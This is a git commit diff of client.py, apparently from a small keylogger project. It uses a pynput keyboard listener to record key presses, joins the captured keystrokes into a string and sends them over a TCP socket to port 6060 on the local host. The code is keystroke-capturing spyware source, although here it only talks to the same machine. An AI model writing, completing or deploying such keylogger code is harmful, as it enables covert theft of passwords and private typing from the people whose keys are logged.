1a76ff3a061930d0436d97328447c51016eefa7f
zahrabytes <bukhaz99@gmail.com>
2024-01-12 11:36:01 -0600

    client complete

--- client.py
+++ client.py
@@ -11,13 +11,17 @@ def on_press(key):
 def on_release(key):
     if key == Key.esc:
         return False
+    
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((socket.gethostname(), 6060))
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((socket.gethostname(), 6060))
     listener.join()
-    
-message = s.recv(2048)
+
+message = "".join(str(key) for key in keystroke)
+s.sendall(message.encode())
+
+response = s.recv(2048).decode()
 
 print(f"Message received: {message}")
 s.close()
